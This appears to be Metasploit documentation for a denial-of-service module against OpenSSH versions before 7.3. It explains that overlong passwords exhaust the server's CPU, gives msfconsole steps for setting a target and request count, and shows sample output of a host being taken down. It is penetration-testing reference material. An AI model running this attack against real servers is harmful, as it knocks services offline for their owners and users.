## Vulnerable Application

If the target is running OpenSSH version prior to 7.3,
 it does not limit the password length for authentication. Hence, to exploit this vulnerability we will send a crafted data which is of 90000 characters
 in length to the 'password' field while attempting to log in to a remote
 machine via ssh with the chosen username. If the machine is vulnerable, it should crash due to high CPU consumption.

## Verification Steps

  1. Install OpenSSH < v7.3
  2. Start `msfconsole`
  3. Do `use auxiliary/dos/ssh/openssh_7.2_dos`
  4. Do `set RHOST <rhost>`
  5. Do `set REQUESTS <# of requests>`
  6. Do `run`
  7. The server should crash nearly instantly

## Options

  **REQUESTS**

  The number of requests to send to the target.

  **RANDOM_UNAME**

  Use a randomly generated username instead of 'root'.

  **CHECK_UP**

  Check if the host is up after each request. 

## Scenarios

  Using the module with `VERBOSE` set to `true`, `REQUESTS` set to 2, and `CHECK_UP` set to `true`.

  ```
  msf auxiliary(openssh_crypt_cpu_dos) > run
  
  [*] Using username: root
  [*] Sending 2 requests to [redacted]:22
  [*] Sending request 1
  [-] [redacted]:22 - Net::SSH::Disconnect: connection closed by remote host ( This means it's working )
  [*] Checking if [redacted] is up.
  [+] Tango down - [redacted] is down!
  [*] Auxiliary module execution completed
  msf auxiliary(openssh_crypt_cpu_dos) > 
  ```

